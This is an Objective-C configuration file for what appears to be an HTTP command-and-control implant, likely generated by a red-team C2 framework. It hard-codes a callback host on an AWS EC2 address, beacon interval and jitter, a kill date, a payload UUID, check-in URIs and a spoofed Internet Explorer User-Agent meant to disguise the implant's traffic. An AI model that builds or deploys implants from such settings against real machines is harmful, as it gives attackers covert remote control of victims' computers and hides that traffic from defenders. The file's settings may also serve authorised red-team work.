
#import "HTTPC2Config.h"

@implementation HTTPC2Config

+ (NSString *)AESPSKEncKey {
    return @"";
}

+ (NSString *)AESPSKDecKey {
    return @"";
}

+ (NSString *)AESPSKValue {
    return @"";
}

+ (NSString *)callbackHost {
    return @"http://ec2-54-245-60-126.us-west-2.compute.amazonaws.com";
}

+ (NSInteger)callbackPort {
    return 80;
}

+ (NSInteger)callbackInterval {
    return 10;
}

+ (NSInteger)callbackJitter {
    return 23;
}

+ (NSString *)killdate {
    return @"2025-09-20";
}

+ (NSDictionary *)headers {
    return @{
        @"User-Agent": @"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko", 
    };
}

+ (NSString *)payloadUUID {
    return @"dd919d02-5d7c-4a7c-9ba1-94e2e2d400bf";
}

+ (BOOL)encryptedExchangeCheck {
    return false;
}

+ (NSString *)getURI {
    return @"index";
}

+ (NSString *)postURI {
    return @"data";
}

+ (NSString *)proxyHost {
    return @"";
}

+ (NSString *)proxyPass {
    return @"";
}

+ (NSString *)proxyPort {
    return @"";
}

+ (NSString *)proxyUser {
    return @"";
}

+ (NSString *)queryPathName {
    return @"q";
}

@end
